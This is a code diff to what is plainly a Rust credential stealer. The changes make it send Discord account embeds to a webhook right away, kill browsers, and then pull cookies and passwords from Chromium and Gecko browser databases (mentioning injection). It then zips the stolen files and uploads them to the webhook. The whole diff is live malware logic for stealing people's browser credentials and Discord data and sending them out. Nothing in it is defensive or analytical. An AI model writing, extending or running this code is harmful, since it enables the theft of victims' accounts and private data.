@@ -150,13 +150,19 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let (_discord_accounts, discord_content, embeds) =
         discord_task.await.unwrap_or((Vec::new(), String::new(), Vec::new()));
+
+    // Discord embeds go out immediately — don't wait for zip/gofile.
+    if !embeds.is_empty() {
+        crate::sender::send_embeds_only(&client, &wbh, &embeds).await;
+    }
+
     let mut all_files = browsers_task.await.unwrap_or_default();
 
     core::kill::kill_browsers();
 
-    // Browsers are closed — retry cookie extraction with cached master keys.
-    let cookie_retry = browsers::chromium::extract_cookies_post_kill();
-    browsers::merge_files(&mut all_files, cookie_retry);
+    // Browsers are closed — inject (if needed) + retry cookies/passwords with unlocked DBs.
+    let post_kill = browsers::chromium::extract_cookies_post_kill();
+    browsers::merge_files(&mut all_files, post_kill);
     let gecko_cookie_retry = browsers::gecko::extract_cookies_post_kill();
     browsers::merge_files(&mut all_files, gecko_cookie_retry);
 
@@ -200,7 +206,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let _ = fs::remove_file(&zip_path);
 
-    let _statuses = crate::sender::send_to_webhook(&client, &wbh, embeds, zip_data, zip_name).await;
+    let _statuses = crate::sender::send_to_webhook(&client, &wbh, Vec::new(), zip_data, zip_name).await;
 
     let _ = fs::remove_file(&zip_path);
 
